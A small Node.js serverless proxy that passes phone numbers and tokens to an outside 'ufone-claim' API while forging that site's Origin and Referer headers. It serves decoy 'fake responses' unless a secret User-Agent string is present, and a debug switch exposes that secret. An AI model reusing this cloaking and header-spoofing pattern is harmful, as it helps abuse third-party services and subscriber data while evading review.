// api/details.js
const axios = require("axios");

const SECRET_CHROME = process.env.SECRET_CHROME || "5246.28";
const FAKE_RESPONSE = { status: true, success: false, message: "Your request was successful, but this is a fake response." };
const axiosInstance = axios.create({ timeout: 5000 });

module.exports = async (req, res) => {
  if (req.method !== "GET") return res.status(405).json({ error: "Method not allowed" });

  if (req.query.debug === "1") {
    return res.status(200).json({ debug: true, ua: req.headers["user-agent"] || null, query: req.query, secret: SECRET_CHROME });
  }

  const ua = (req.headers["user-agent"] || "").trim();
  const isChrome = /chrome/i.test(ua) && ua.includes(SECRET_CHROME);
  if (!isChrome) return res.status(200).json(FAKE_RESPONSE);

  const phoneNumber = req.query.num || "";
  const deviceId = req.query.id || "";
  const token = req.query.token || "";
  const subToken = req.query.subToken || "";

  try {
    const response = await axiosInstance.post(
      "https://ufone-claim.vercel.app/api/get-user-details",
      { phoneNumber, token, subToken, deviceId },
      {
        headers: {
          "Content-Type": "application/json",
          "User-Agent": ua,
          "Origin": "https://ufone-claim.vercel.app",
          "Referer": "https://ufone-claim.vercel.app/"
        }
      }
    );
    return res.status(response.status || 200).json(response.data);
  } catch (err) {
    console.error("[details] forward error:", err && (err.message || err));
    return res.status(200).json(FAKE_RESPONSE);
  }
};
